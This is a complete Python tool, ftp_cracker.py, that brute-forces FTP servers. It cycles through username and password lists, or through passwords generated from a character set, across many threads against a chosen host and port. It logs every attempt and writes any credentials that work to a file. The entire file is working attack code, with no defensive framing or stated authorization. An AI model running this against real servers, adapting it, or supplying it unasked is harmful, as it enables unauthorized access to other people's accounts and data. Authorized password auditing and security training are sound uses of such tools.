#!/usr/bin/env python3
# file: ftp_cracker.py

import ftplib
from threading import Thread
import queue
from colorama import init, Fore
import sys
import argparse
import itertools
import string
import os
import time

init()
q = queue.Queue()
stop_event = False
exit_on_success = False
threads_list = []


def connect_ftp(host, port):
    global stop_event
    while not q.empty() and not stop_event:
        user, password = q.get()
        try:
            with ftplib.FTP() as server:
                attempt = f"Trying: {user}:{password}\n"
                print(f'[!] {attempt.strip()}')
                with open("ftp_attempts.log", "a") as log:
                    log.write(attempt)

                server.connect(host, port, timeout=5)
                server.login(user, password)

                stop_event = True

                print(f"{Fore.GREEN}[+] Found credentials:")
                print(f"\tHost: {host}")
                print(f"\tUser: {user}")
                print(f"\tPassword: {password}{Fore.RESET}")

                with open("ftp_credentials.txt", "w") as f:
                    f.write(f"{user}@{host}:{password}\n")

                if exit_on_success:
                    os._exit(0)
                break
        except ftplib.error_perm:
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Fore.RESET}")
        finally:
            q.task_done()


def load_lines(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        return file.read().splitlines()


def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)


def main():
    global exit_on_success, stop_event

    parser = argparse.ArgumentParser(description='FTP Brute Force.')
    parser.add_argument('--host', required=True, help='FTP server host or IP.')
    parser.add_argument('--port', type=int, default=21, help='FTP server port.')
    parser.add_argument('-t', '--threads', type=int, default=30, help='Number of threads.')
    parser.add_argument('-u', '--user', help='A single username.')
    parser.add_argument('-U', '--userlist', help='Path to the usernames list.')
    parser.add_argument('-w', '--wordlist', help='Path to the passwords list.')
    parser.add_argument('-g', '--generate', action='store_true', help='Generate passwords.')
    parser.add_argument('--min_length', type=int, default=1)
    parser.add_argument('--max_length', type=int, default=4)
    parser.add_argument('-c', '--chars', type=str, default=string.ascii_letters + string.digits)
    parser.add_argument('--exit-on-success', action='store_true', help='Exit program immediately on first successful login.')

    args = parser.parse_args()
    host, port, n_threads = args.host, args.port, args.threads
    exit_on_success = args.exit_on_success

    if not args.user and not args.userlist:
        print("Please provide a username or a userlist.")
        sys.exit(1)

    users = load_lines(args.userlist) if args.userlist else [args.user]

    if args.wordlist:
        passwords = load_lines(args.wordlist)
    elif args.generate:
        passwords = list(generate_passwords(args.min_length, args.max_length, args.chars))
    else:
        print("Please provide a wordlist or enable password generation.")
        sys.exit(1)

    print(f"[+] Usernames to try: {len(users)}")
    print(f"[+] Passwords to try: {'generated' if args.generate else len(passwords)}")

    for user in users:
        for password in passwords:
            q.put((user, password))

    for _ in range(n_threads):
        thread = Thread(target=connect_ftp, args=(host, port))
        thread.start()
        threads_list.append(thread)

    while not q.empty():
        time.sleep(0.1)

    stop_event = True
    for t in threads_list:
        t.join()


if __name__ == '__main__':
    main()

